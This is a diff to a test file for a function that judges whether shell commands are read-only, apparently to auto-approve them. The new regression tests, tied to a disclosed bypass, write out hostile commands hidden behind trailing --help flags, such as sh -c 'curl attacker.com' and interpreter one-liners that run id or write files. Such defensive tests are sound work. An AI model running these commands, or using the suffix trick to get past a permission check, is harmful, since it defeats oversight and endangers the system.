@@ -93,10 +93,38 @@ class TestIsReadOnlyBash:
         assert is_read_only_bash("brazil workspace list") is True
 
     def test_help_and_version(self):
+        # Commands whose head is on the allowlist with --help/--version suffix
         assert is_read_only_bash("brazil-build --help") is True
         assert is_read_only_bash("python --version") is True
+        assert is_read_only_bash("python3 --version") is True
         assert is_read_only_bash("java -version") is True
-        assert is_read_only_bash("some-tool --help") is True
+        assert is_read_only_bash("node --version") is True
+        assert is_read_only_bash("node --help") is True
+        # Commands NOT on the allowlist are correctly refused even with --help
+        assert is_read_only_bash("some-tool --help") is False
+        assert is_read_only_bash("npm --help") is False
+        # Exact-match entries must NOT prefix-match with additional arguments
+        assert is_read_only_bash("node --help --require /tmp/payload.js") is False
+        assert is_read_only_bash("brazil-build --help --eval 'malicious'") is False
+        assert is_read_only_bash("java --help -jar /tmp/evil.jar") is False
+        assert is_read_only_bash("javac --help -processor evil") is False
+
+    def test_interpreter_suffix_bypass_rejected(self):
+        """Regression: trailing --help/--version must NOT auto-approve
+        interpreter commands whose head is not on the read-only allowlist.
+        See: coordinated disclosure from Robert Noack, 2026-08-15."""
+        # bash -c '<payload>' --help — interpreter passes flag to script
+        assert is_read_only_bash("bash -c 'touch /tmp/owned' --help") is False
+        assert is_read_only_bash("bash -c 'whoami' --version") is False
+        # python3 -c '<payload>' --help
+        assert is_read_only_bash(
+            "python3 -c \"open('/tmp/p1','w').write('x')\" --help"
+        ) is False
+        # sh -c variant
+        assert is_read_only_bash("sh -c 'curl attacker.com' --help") is False
+        # ruby/perl -e variants
+        assert is_read_only_bash("ruby -e 'system(\"id\")' --help") is False
+        assert is_read_only_bash("perl -e 'exec(\"id\")' --help") is False
 
     def test_compound_read_commands(self):
         assert is_read_only_bash("git status && git log --oneline -3") is True
